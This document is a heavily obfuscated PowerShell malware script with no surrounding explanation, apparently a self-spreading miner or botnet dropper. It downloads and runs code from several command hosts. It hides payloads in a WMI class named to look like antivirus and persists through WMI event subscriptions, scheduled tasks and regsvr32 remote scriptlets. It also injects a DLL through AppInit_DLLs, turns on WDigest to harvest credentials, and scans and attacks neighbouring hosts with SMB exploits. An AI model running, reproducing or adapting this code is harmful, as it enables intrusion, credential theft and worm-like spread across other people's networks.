$se=@(('cat'+'.xiaoji'+'ji.'+'nl'),('c'+'a'+'t.das'+'habi.in'),('c'+'at.xiao'+'shabi'+'.nl'))
$nic=('cat'+'.xiaoji'+'ji.'+'nl')
foreach($t in $se)
{
    $pin=test-connection $t
    if ($pin -ne $null)
    {
        $nic=$t
        break
    }
}
$nic=$nic+(':'+'80')
if ((geT`-WmI`ObjECt Win32_OperatingSystem).osarchitecture.contains('32'))
{
	i`EX(NE`W`-oBJE`CT Net.WebClient).DownloadString("http://$nic/networks.ps1")
	return
}
$mimi = $miiiiii
$funs = $fffffff
$sc = $ssssssss
try{
    $StaticClass = N`E`w-obJEcT Management.ManagementClass((('ro'+'ot{0}de'+'f'+'a'+'ult')-F  [cHAR]92), $null,$null)
    $StaticClass.Name = ('Syst'+'em_A'+'nt'+'i_'+'Virus'+'_C'+'ore')
    $StaticClass.Put() | out-N`U`Ll
    $StaticClass.Properties.Add(('m'+'imi') , $mimi)
    $StaticClass.Put() | O`UT`-NUlL
    $StaticClass.Properties.Add(('fu'+'ns') , $funs)
    $StaticClass.Put() | O`UT`-NULl
    $StaticClass.Properties.Add('sc' , $sc)
    $StaticClass.Put() | o`Ut`-NuLL
    $StaticClass.Properties.Add(('ips'+'u') ," ")
    $StaticClass.Put() | OUt-n`ULl
    $StaticClass.Properties.Add(('i'+'17') ," ")
    $StaticClass.Put() | OUt-N`UlL
    $StaticClass.Properties.Add(('v'+'er'), ('5.'+'1'))
    $StaticClass.Put() | o`Ut-N`Ull
} catch {
    $defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
    i`Ex $defun
		RunDDOS "cohernece.exe"
    $Networks = GET-`wmiOB`j`Ect Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}
    [byte[]]$sc=[System.Convert]::FromBase64String($sc)
    foreach ($Network in $Networks)
    {
        $IPAddress  = $Network.IpAddress[0]
        if ($IPAddress -match ('^1'+'69.'+'254')){continue}
        $SubnetMask  = $Network.IPSubnet[0]
        $ips_c=Get-networkrange $IPAddress $SubnetMask
        $ips_b=Get-IpInB $IPAddress
        $ips=$ips_c+$ips_b
        $tcpconn = Ne`Tstat -anop tcp
        foreach ($t in $tcpconn)
        {
            $line =$t.split(' ')| ?{$_}
            if (!($line -is [array])){continue}
            if ($line.count -le 4){continue}
            $i=$line[-3].split(':')[0]
            if ( ($line[-2] -eq ('ESTABL'+'ISH'+'ED')) -and  ($i -ne ('1'+'2'+'7.0.0.'+'1')) -and ($ips -notcontains $i))
            {
                $ips+=$i
            }
        }
        #if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
        foreach ($ip in $ips)
        {
            #if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
            if ($ip -eq $IPAddress){continue}
						if ((Test-Port $ip) -ne $false -and $ipsu -notcontains $ip)
            {
                $vul=[PingCastle.Scanners.m17sc]::Scan($ip)
                if ($vul -and $i17 -notcontains $ip)
                {
                    $res=E`B7 $ip $sc
                    if (!($res -eq $true))
                    {e`B8 $ip $sc}
                    $i17 = $i17 + " "+$ip
                }
            }
        }
    }
}
$filterName = ('Wi'+'ndow'+'s Eve'+'nts '+'Filt'+'er')
$consumerName = ('Window'+'s Eve'+'nts C'+'on'+'sumer')
$Script=@'
$se=@(('cat'+'.xiaoji'+'ji.'+'nl'),('c'+'a'+'t.das'+'habi.in'),('c'+'at.xiao'+'shabi'+'.nl'))
$nic=('cat'+'.xiaoji'+'ji.'+'nl')
foreach($t in $se)
{
    $pin=test-connection $t
    if ($pin -ne $null)
    {
        $nic=$t
        break
    }
}
$nic=$nic+(':'+'80')
$ver=(New-Object Net.WebClient).DownloadString("http://$nic/ver.txt").Trim()
if($ver -ne $null){
    $ver_tmp=([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['ver'].Value
    if($ver -ne $ver_tmp){
        IEX (New-Object Net.WebClient).DownloadString("http://$nic/networks.ps1")
        return
    }
}
$stime=[Environment]::TickCount
$funs = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['funs'].Value
$defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
iex $defun
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -notmatch 'Windows Events'} |Remove-WmiObject
[array]$psids= get-process -name powershell |sort cpu -Descending| ForEach-Object {$_.id}
$tcpconn = netstat -anop tcp
$exist=$False
if ($psids -ne $null )
{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
        if (($psids[0] -eq $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":443") -or $t.contains(":13531")))
        {
            $exist=$true
            break
        }
    }
}
KillBot('System_Anti_Virus_Core')
if (!$exist -and ($psids.count -le 8))
{
$ErrorActionPreference= (("{2}{1}{0}"-f 'ntl','e','sil')+'y'+("{1}{0}"-f'onti','c')+'nue')
mkdir ((("{2}{1}{4}{6}{0}{3}{5}" -f'so','aKq','c:KqoProgramDat','ftK','o','qoNetwork','Micro')).RePLaCe('Kqo','\'))
mkdir (('c:LxzPro'+'gram'+'Data'+'Lx'+'zMic'+'rosoft'+'L'+'xzN'+'etwor'+'k'+'LxzDownlo'+'ad'+'er').rePLaCE('Lxz','\'))
mkdir (('c:{0}Pro'+'gramData{0'+'}M'+'i'+'croso'+'f'+'t{0}'+'N'+'etwo'+'r'+'k{'+'0}'+'Conn'+'ections')  -f  [CHAr]92)
mkdir (('c:{0}'+'P'+'rogramDa'+'ta{'+'0}Mi'+'cros'+'of'+'t'+'{0}W'+'ind'+'ows{0}'+'Cache'+'s')  -F[cHAR]92)
$nssmdir=(('c:{0}'+'P'+'rogr'+'amData{0}Mic'+'r'+'osoft'+'{'+'0}Netw'+'ork{0'+'}Downl'+'oader'+'{0'+'}services.e'+'xe')-F  [chAR]92)
$sysdir=(('c'+':8am'+'Pr'+'ogr'+'amData8am'+'M'+'icrosoft8'+'a'+'mNetw'+'ork8amConnection'+'s8amOS'+'FMo'+'unt.sys') -RePlace ([CHar]56+[CHar]97+[CHar]109),[CHar]92)
$mondir=(('c:'+'{'+'0}P'+'ro'+'g'+'r'+'a'+'mDat'+'a{0'+'}'+'Micr'+'osoft{'+'0'+'}Networ'+'k'+'{'+'0}Connections'+'{0}service'+'s.exe')-F [chaR]92)
$mindir=(('c'+':{0}ProgramData{0'+'}Micr'+'oso'+'ft{0}Ne'+'tw'+'ork{0}service'+'s.'+'ex'+'e')  -F [chAr]92)
$uasdir=(('c:'+'{0}P'+'rog'+'ra'+'m'+'Da'+'ta{0'+'}M'+'icros'+'oft{0}Win'+'dows'+'{0'+'}WER{'+'0}c'+'m'+'d.exe')  -f[CHAr]92)
$accessdir=(('c:'+'{0}Prog'+'ra'+'mDa'+'ta{'+'0}'+'Mi'+'cros'+'oft'+'{'+'0}W'+'indows{0}Caches{0}Sec'+'ur'+'eAss'+'ess'+'ment'+'Handler'+'stor.dll')-f [cHaR]92)
$Service_Name=("{0}{3}{1}{2}" -f'Even','g','s','t Lo')
$Service_Name_back=("{3}{1}{0}{2}"-f 'Serv','t ','ice','Even')
$nssmhash=(New-Object Net.WebClient).DownloadString("http://$nic/nssmhash.txt").Trim()
$monhash=(New-Object Net.WebClient).DownloadString("http://$nic/monhash.txt").Trim()
$minhash=(New-Object Net.WebClient).DownloadString("http://$nic/minhash.txt").Trim()
$vie=(New-Object Net.WebClient).DownloadString(('htt'+'p://127.0'+'.0'+'.1:'+'5'+'986/verify'))
If (!($? -ne "True")){
Write-Output "port yes";
Write-Output "verify yes";
}else{
Write-Output "port not";
Write-Output "verify no";
if(!(test-path($nssmdir))){

RunNSSM "nssm"
Move-Item $env:temp\nssm $nssmdir
attrib +s +h +a +r $nssmdir
}else
{
  if(!((Get-FileHash $nssmdir).hash -eq $nssmhash))
{
Remove-Item $nssmdir
RunNSSM "nssm"
Move-Item $env:temp\nssm $nssmdir
attrib +s +h +a +r $nssmdir
}
}
if(!(test-path($sysdir))){

RunSYS "sys"
Move-Item $env:temp\sys $sysdir
attrib +s +h +a +r $sysdir
}
if(!(test-path($mondir))){

RunMON "mon.exe"
SlEEp -Seconds 5
attrib +s +h +a +r $mondir
Remove-Item $env:temp\mon.exe
}else
{
if(!((Get-FileHash $mondir).hash -eq $monhash))
{
Remove-Item $mondir
RunMON "mon.exe"
SlEEp -Seconds 5
attrib +s +h +a +r $mondir
Remove-Item $env:temp\mon.exe
}
}
if(!(test-path($mindir))){

RunMIN "min.exe"
SlEEp -Seconds 5
attrib +s +h +a +r $mindir
Remove-Item $env:temp\min.exe
}else
{
if(!((Get-FileHash $mindir).hash -eq $minhash))
{
Remove-Item $mindir
RunMIN "min.exe"
SlEEp -Seconds 5
attrib +s +h +a +r $mindir
Remove-Item $env:temp\min.exe
}
}
if(!(test-path($accessdir))){

RunACCESS "access"
Move-Item $env:temp\access $accessdir
attrib +s +h +a +r $accessdir
}
if(!(test-path($uasdir)))
{
RunUAS "uas.exe"
SlEEp -Seconds 5
attrib +s +h +a +r $uasdir
Remove-Item $env:temp\uas.exe
}
RunDDOS "cohernece.exe"
c:\windows\System32\reg.exe add (('hklm{'+'0}'+'SOFT'+'W'+'ARE{0'+'}M'+'icrosoft{'+'0}'+'W'+'indows '+'NT'+'{0}'+'Cu'+'rr'+'ent'+'Ve'+'rsion'+'{'+'0'+'}Window'+'s') -F  [ChAr]92) /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f /reg:64
c:\windows\System32\reg.exe add (('hklm{0}SOFTWAR'+'E'+'{0}Micro'+'s'+'oft{0}Wi'+'ndows'+' '+'NT{0'+'}Cu'+'rrentVers'+'io'+'n{0}Wi'+'ndows') -f  [CHaR]92) /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f /reg:64
c:\windows\System32\reg.exe add (('hkl'+'m7'+'GNSOFTW'+'ARE7GNMicrosoft7GNWind'+'o'+'w'+'s NT7GNCurrent'+'Versio'+'n'+'7GN'+'Win'+'dows').REPLAce(([ChAR]55+[ChAR]71+[ChAR]78),[String][ChAR]92)) /v AppInit_DLLs /t REG_SZ /d (('C:vdbvd'+'b'+'P'+'rogramDatavdbvdbMic'+'ro'+'softv'+'db'+'v'+'d'+'bWindows'+'vdbvdbCachesvdb'+'vdbSecure'+'AssessmentHa'+'ndler'+'s'+'tor'+'.dll') -CREPlaCE ([cHar]118+[cHar]100+[cHar]98),[cHar]92) /f /reg:64
$p1w7U  =  ")''NIoJ-]52,51,4[cePSmoc:VNE$ (.| )43]rAhC[]gnirTS[,'GAH'(eCAlper.)'$','aoP'(eCAlper.)'G'+'AH'+')DW;;;OWDW'+'CRDSRCOL'+'TDPWPRWSCL'+'CDC'+'C;AF;'+'UA'+'('+':S'+')'+'US;;;'+'CRRC'+'OLWSCLCC;'+';A()UI;'+';'+';CRR'+'COL'+'WSCL'+'CC;;'+'A()AB'+';;;O'+'WD'+'WCR'+'DSRCOLT'+'DPWPR'+'WSCLCDCC;'+';A('+')YS;;;C'+'R'+'RCOLTD'+'PWPRWSCLCC'+';;'+'A'+'(:DGAH emaN_e'+'civr'+'eSaoP '+' te'+'sds e'+'xe.cs'(  " ; . ( $PshOMe[21]+$PsHOme[34]+'x')( $P1w7u[- 1..- ($P1w7u.leNgTH)]-join'')
 if($Service = Get-Service $Service_Name)
  {
  if (($service).status -eq 'stopped')
  {
  Start-Service -Name $service_name | Out-Null
  SlEEp -Seconds 5
  if($Service = Get-Service $Service_Name)
  {
  if (($service).status -eq 'stopped')
  {
  sc.exe delete $service_name
  C:\ProgramData\Microsoft\Network\Downloader\services install $service_name $mindir | Out-Null
  Start-Service -Name $service_name | Out-Null
  if($Service = Get-Service $Service_Name)
  {
  if (($service).status -eq 'stopped')
  {
  Start-Process $mondir
  sc.exe delete $Service_Name
  }
  }
  }
  }
$alyFZ9  =[cHar[]]")'X'+]31[DIlLEHs$+]1[diLLEhS$ (. | )63]Rahc[,'W1r'  eCaLper-43]Rahc[,)221]Rahc[+56]Rahc[+15]Rahc[( eCaLper- )'zA3)DW;;'+';OWDW'+'CRDSRCOLTDPWPRWSCLCDCC;AF;UA(:'+'S)'+'AB;;;OWDWCRDS'+'RCOLTDPWPRWSCLCDCC'+';;A'+'()YS;;;'+'CRRCOLTDPWPRWSCLCC;;A()'+'US'+';'+';;C'+'RR'+'C'+'OLWS'+'CLCC;;A('+')UI;'+';;'+'CRRCOL'+'WSCL'+'CC;'+';A'+'()AB;;;CCDST'+'DPW'+'C'+'LCD;;'+'D()US;;;CCDST'+'DPW'+'CLCD'+';'+';'+'D()UI;;;CC'+'D'+'S'+'T'+'DPWCLCD;;D(:DzA3 eman_e'+'c'+'iv'+'resW1r tesds exe.cs'((" ;  [Array]::ReVErsE((gET-vARiABLe ALyFz9  ).valUE ); &( $pshoME[21]+$PSHOmE[34]+'x') ( [STriNg]::joIn('', (gET-vARiABLe ALyFz9  ).valUE) )
  }
  else
  {
$alyFZ9  =[cHar[]]")'X'+]31[DIlLEHs$+]1[diLLEhS$ (. | )63]Rahc[,'W1r'  eCaLper-43]Rahc[,)221]Rahc[+56]Rahc[+15]Rahc[( eCaLper- )'zA3)DW;;'+';OWDW'+'CRDSRCOLTDPWPRWSCLCDCC;AF;UA(:'+'S)'+'AB;;;OWDWCRDS'+'RCOLTDPWPRWSCLCDCC'+';;A'+'()YS;;;'+'CRRCOLTDPWPRWSCLCC;;A()'+'US'+';'+';;C'+'RR'+'C'+'OLWS'+'CLCC;;A('+')UI;'+';;'+'CRRCOL'+'WSCL'+'CC;'+';A'+'()AB;;;CCDST'+'DPW'+'C'+'LCD;;'+'D()US;;;CCDST'+'DPW'+'CLCD'+';'+';'+'D()UI;;;CC'+'D'+'S'+'T'+'DPWCLCD;;D(:DzA3 eman_e'+'c'+'iv'+'resW1r tesds exe.cs'((" ;  [Array]::ReVErsE((gET-vARiABLe ALyFz9  ).valUE ); &( $pshoME[21]+$PSHOmE[34]+'x') ( [STriNg]::joIn('', (gET-vARiABLe ALyFz9  ).valUE) )
  }
  }
  else
  {
  C:\ProgramData\Microsoft\Network\Downloader\services install $service_name $mindir | Out-Null
  Start-Service -Name $service_name | Out-Null
  SlEEp -Seconds 5
  if(!($Service = Get-Service $Service_Name))
  {
  C:\ProgramData\Microsoft\Network\Downloader\services install $service_name_back $mondir | Out-Null
  Start-Service -Name $service_name_back | Out-Null
  SlEEp -Seconds 5
  if(!($Service = Get-Service $service_name_back)){
  Start-Process $mondir
  sc.exe delete $Service_Name
  sc.exe delete $service_name_back
  }
  else
  {
  if (($service).status -eq 'stopped')
  {
  sc.exe delete $service_name_back
  C:\ProgramData\Microsoft\Network\Downloader\services install $service_name_back $mondir | Out-Null
  Start-Service -Name $service_name_back | Out-Null
  }
}
}
$alyFZ9  =[cHar[]]")'X'+]31[DIlLEHs$+]1[diLLEhS$ (. | )63]Rahc[,'W1r'  eCaLper-43]Rahc[,)221]Rahc[+56]Rahc[+15]Rahc[( eCaLper- )'zA3)DW;;'+';OWDW'+'CRDSRCOLTDPWPRWSCLCDCC;AF;UA(:'+'S)'+'AB;;;OWDWCRDS'+'RCOLTDPWPRWSCLCDCC'+';;A'+'()YS;;;'+'CRRCOLTDPWPRWSCLCC;;A()'+'US'+';'+';;C'+'RR'+'C'+'OLWS'+'CLCC;;A('+')UI;'+';;'+'CRRCOL'+'WSCL'+'CC;'+';A'+'()AB;;;CCDST'+'DPW'+'C'+'LCD;;'+'D()US;;;CCDST'+'DPW'+'CLCD'+';'+';'+'D()UI;;;CC'+'D'+'S'+'T'+'DPWCLCD;;D(:DzA3 eman_e'+'c'+'iv'+'resW1r tesds exe.cs'((" ;  [Array]::ReVErsE((gET-vARiABLe ALyFz9  ).valUE ); &( $pshoME[21]+$PSHOmE[34]+'x') ( [STriNg]::joIn('', (gET-vARiABLe ALyFz9  ).valUE) )
   }
 }
}
SchTasKS /create /tn ((('Mi'+'crosoftSG3Windo'+'wsSG3'+'RACSG3R'+'ac'+'Tas'+'kMgr')-rEPlACE 'SG3',[ChaR]92)) /tr (('wm'+'ic '+'os'+' '+'g'+'et '+"/format:'http://$nic/net/net.xsl'")) /sc minute /mo 300 /ru (('S'+'ystem')) /F | Out-Null
$NTLM=$False
$mimi = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['mimi'].Value
$a, $NTLM= Get-creds $mimi $mimi
$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}
$ipsu = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['ipsu'].Value
$i17 = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['i17'].Value
$scba= ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['sc'].Value
[byte[]]$sc=[System.Convert]::FromBase64String($scba)
foreach ($Network in $Networks)
{
    $IPAddress  = $Network.IpAddress[0]
	if ($IPAddress -match '^169.254'){continue}
    $SubnetMask  = $Network.IPSubnet[0]
    $ips_c=Get-networkrange $IPAddress $SubnetMask
    $ips_b=Get-IpInB $IPAddress
    $ips=$ips_c+$ips_b
	$tcpconn = netstat -anop tcp
	foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if (!($line -is [array])){continue}
		if ($line.count -le 4){continue}
		$i=$line[-3].split(':')[0]
        if ( ($line[-2] -eq 'ESTABLISHED') -and  ($i -ne '127.0.0.1') -and ($ips -notcontains $i))
        {
            $ips+=$i
        }
    }
    if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
    foreach ($ip in $ips)
    {
        if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
        if ($ip -eq $IPAddress){continue}
				if ((Test-Port $ip) -ne $false -and $ipsu -notcontains $ip)
        {
            $re=0
            if ($a.count -ne 0)
            {$re = test-ip -ip $ip -creds $a  -nic $nic -ntlm $NTLM }
            if ($re -eq 1){$ipsu =$ipsu +" "+$ip}
			else
			{
				$vul=[PingCastle.Scanners.m17sc]::Scan($ip)
				if ($vul -and $i17 -notcontains $ip)
				{
					$res=eb7 $ip $sc
					if (!($res -eq $true))
					{eb8 $ip $sc}
					$i17 = $i17 + " "+$ip
				}
			}
        }
    }
 }
$StaticClass=New-Object Management.ManagementClass((('root'+'wM2defa'+'ult:'+'Sys'+'t'+'e'+'m_Anti'+'_Virus_Core').REPlacE(([char]119+[char]77+[char]50),[sTriNg][char]92)))
$StaticClass.SetPropertyValue('ipsu' ,$ipsu)
$StaticClass.Put()
$StaticClass.SetPropertyValue('i17' ,$i17)
$StaticClass.Put()
'@
$Scriptbytes  = [System.Text.Encoding]::Unicode.GetBytes($Script)
$EncodedScript=[System.Convert]::ToBase64String($Scriptbytes)
$Query = (('SELECT *'+' FR'+'OM __'+'InstanceM'+'odi'+'fi'+'ca'+'tion'+'Eve'+'nt WITHIN 108'+'00'+' W'+'HER'+'E Targ'+'e'+'t'+'I'+'nsta'+'nce I'+'SA BiAWin3'+'2'+'_'+'Pe'+'rf'+'Form'+'at'+'tedDa'+'ta'+'_'+'PerfOS'+'_Sy'+'stemBiA').rePlACE(([Char]66+[Char]105+[Char]65),[StRIng][Char]39))
geT-`W`MIO`BJeCt -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter ((('__Pat'+'h LIKE'+' 361%'+'Wind'+'ows Even'+'ts Con'+'su'+'mer%'+'36'+'1')).rEplaCE(('3'+'61'),[STriNG][CHAr]39)) | ReMove-`W`miOb`JEcT
GET`-`Wm`IobjEct -Namespace root\Subscription -Class __EventFilter -filter (('nam'+'e= {0}Window'+'s Events Fil'+'te'+'r{0}') -F  [ChAR]39) |r`emoVE-WMI`obJ`e`ct
gEt-`wM`io`BJ`eCT -Namespace root\Subscription -Class CommandLineEventConsumer -Filter ((('Na'+'me=F'+'3oWindows'+' Events'+' Cons'+'um'+'erF'+'3o')).RePLAce(('F'+'3o'),[StRing][cHar]39)) | removE-`W`M`IOBJect
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='fuckyoumm3'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='fuckyoumm4'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%fuckyoumm%'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='fuckamm3'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='fuckamm4'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='fuckamm4'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%fuckamm%'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilterlog'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumerlog'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilterlogs'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumerlogs'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotConsumerlog%'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Eventloger'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Eventloger'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Eventloger%'" | Remove-WmiObject -Verbose
NE`TSh ipsec static add policy name=netbc
Ne`TSH ipsec static add filterlist name=block
n`eTsh ipsec static add filteraction name=block action=block
nE`TSh ipsec static add filter filterlist=block any srcmask=32 srcport=0 dstaddr=me dstport=445 protocol=tcp description=445
NeT`sH ipsec static add rule name=block policy=netbc filterlist=block filteraction=block
net`Sh ipsec static set policy name=netbc assign=y
$FilterParams = @{
        Namespace = (('r'+'ootu'+'7gsubscription')  -CRePLaCE  ([cHAr]117+[cHAr]55+[cHAr]103),[cHAr]92)
        Class = ('_'+'_Ev'+'entFil'+'ter')
        Arguments =@{Name=$filterName;EventNameSpace=(('ro'+'ot'+'DaJcimv2')  -CrePLACE  ([chAr]68+[chAr]97+[chAr]74),[chAr]92);QueryLanguage=('W'+'QL');Query=$Query}
        ErrorAction = ('Si'+'le'+'ntly'+'C'+'ontinue')
    }
$WMIEventFilter = s`Et-`w`miINStan`Ce @FilterParams
$ConsumerParams = @{
        Namespace = (('roo'+'t{0'+'}subscri'+'pt'+'ion')  -f  [chAr]92)
        Class = ('Comma'+'ndL'+'ine'+'E'+'ventCon'+'sumer')
        Arguments =@{ Name = $consumerName; CommandLineTemplate=('po'+'we'+'rsh'+'ell.ex'+'e -NoP '+'-'+'N'+'o'+'nI'+' -W Hid'+'den -'+'E ')+"$EncodedScript"}
        ErrorAction = ('Sil'+'ent'+'lyCont'+'inue')
    }
$WMIEventConsumer = s`Et`-wM`I`inStAnce @ConsumerParams
s`ET-WmiInS`TaNCE -Class __FilterToConsumerBinding -Namespace (('ro'+'otL'+'BEsu'+'bs'+'cripti'+'on').rePLacE('LBE',[StRInG][chaR]92)) -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} | ouT-N`U`Ll
SChTASks /create /tn ('Microsoft\Windows\MUI\LMRemove') /tr ('regsvr32 /u /s /i:http://cat.dashabi.in/networks.xsl scrobj.dll') /sc onstart /ru ('System') /F | Out-Null
SchTasKS /create /tn ('Microsoft\Windows\Multimedia\SystemEventService') /tr ('regsvr32 /u /s /i:http://cat.xiaojiji.nl/networks.xsl scrobj.dll') /sc minute /mo 720 /ru ('System') /F | Out-Null
$xk51i  = ")'x'+]31[diLLEHS$+]1[DIlLeHS$ (&| )63]raHc[]gniRtS[,'ksc'(ecAlpER.)43]raHc[]gniRtS[,)811]raHc[+38]raHc[+111]raHc[((ecAlpER.)'\','Y94'(ecAlpER.)'vS'+'o*Y9'+'4krowem'+'a'+'r'+'F TEN.'+'Y94'+'sw'+'odniWY94'+'t'+'fosor'+'ciMY9'+'4sksa'+'TY'+'9423met'+'sysY94too'+'Rm'+'ets'+'yS:'+'v'+'n'+'ekscvS'+'o '+'meti'+'-evom'+'er'(" ;iEx ($XK51I[ - 1.. - ($XK51I.LENgTh) ]-jOIN'')
$QBH3=[CHaR[ ] ] " ))63]rAHc[,43]rAHc[,29]rAHc[ f-  )'}1'+'{*'+'}0{m'+'et'+'syS}'+'0{ALP}'+'0{swo'+'dniW}'+'0{tfo'+'s'+'orc'+'iM'+'}0{'+'s'+'ksaT}0'+'{'+'2'+'3m'+'etsys}0{tooRmet'+'syS:vne}2{}1{'+' '+'meti-evomer'((()'x'+]31[DiLLEHS$+]1[dILLehS$ (&"; [ArRAY]::RevERSE( ( VArIaBlE ('qB'+'h3')).vaLUe ); ( VArIaBlE ('qB'+'h3')).vaLUe -joiN'' | . ( $sHELLiD[1]+$shELliD[13]+'x')
$4bG9C  =  [ChAR[ ]]" ) )421]rAhC[,93]rAhC[,63]rAhC[,29]rAhC[  F-)')9 tnuoC- '+'modnaR-teG }3'+'{ )221..79+09'+'..56(]][rah'+'c[( '+'nio'+'j- +'+' '+'}2{}0{me'+'tsyS}'+'0{'+'AL'+'P}0'+'{swodni'+'W}0{t'+'f'+'o'+'so'+'rc'+'iM}2{=sm'+'od'+'nar}1'+'{'(( ()''niOj-]2,11,3[EMAN.)'*rDm*' vg((&" ; [ARray]::reVerse( $4bg9c );-jOIN $4bg9c| .( $Env:COmsPec[4,15,25]-JoIn'')
$RAZl7 =  [CHAr[] ]" ) )63]RahC[]GNiRTS[,'nS4'(ECaLPEr.)93]RahC[]GNiRTS[,'tcN'(ECaLPEr.)'|',)011]RahC[+211]RahC[+94]RahC[((ECaLPEr.)'lluN-tuO np1 '+'F/ )tcNmetsy'+'Stc'+'N'+'( ur/ 0'+'24'+' om'+'/ etunim cs'+'/ )tcNlld.jbo'+'r'+'cs lsx.skrowt'+'en/'+'ln.'+'iba'+'hs'+'oai'+'x.t'+'ac//:ptth:i/'+' s/'+' u/'+' 2'+'3r'+'vsgert'+'c'+'N( rt'+'/ )s'+'modnaRnS4('+' nt/ e'+'taerc'+'/ SKsaTh'+'cS'( ( )'X'+]03[EmOHSP$+]4[EMoHSP$ ( ."; [array]::REvERSE((  iteM ("v"+"aRiA"+"bLE"+":ra"+"zL7")).VALue) ; invoKE-ExprEsSiOn (-joiN(  iteM ("v"+"aRiA"+"bLE"+":ra"+"zL7")).VALue)
set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -name UseLogonCredential -value 1
if (tE`sT-p`ATh ($env:SystemRoot+(('1e'+'mt'+'em'+'p1em'+'y1.bat').replaCe(([CHAR]49+[CHAR]101+[CHAR]109),'\')))){r`e`MOve`-Item -Path ($env:SystemRoot+(('Ks'+'ztempK'+'s'+'z'+'y1.bat').REpLaCE(([CHAr]75+[CHAr]115+[CHAr]122),'\')))  -Force}
P`oW`ErcFg /CHANGE -standby-timeout-ac 0
POW`ErC`FG /CHANGE -hibernate-timeout-ac 0
POwe`Rc`Fg -SetAcValueIndex 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 000
[array]$psids= Get-`prOCe`Ss -name powershell |s`Ort cpu -Descending| F`o`ReA`CH-oBJEcT {$_.id}
$tcpconn = ne`TST`AT -anop tcp
if ($psids -ne $null )
{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
        if (($psids[0] -eq $line[-1]) -and $t.contains(('ESTABL'+'ISHE'+'D')) -and ($t.contains((':80'+' ')) -or $t.contains((':4'+'43')) -or $t.contains((':13'+'531'))) )
        {
            g`E`T-PROCESS -id $psids[0] | s`TO`P-PRo`cesS -force
            break
        }
    }
}
I`eX $script
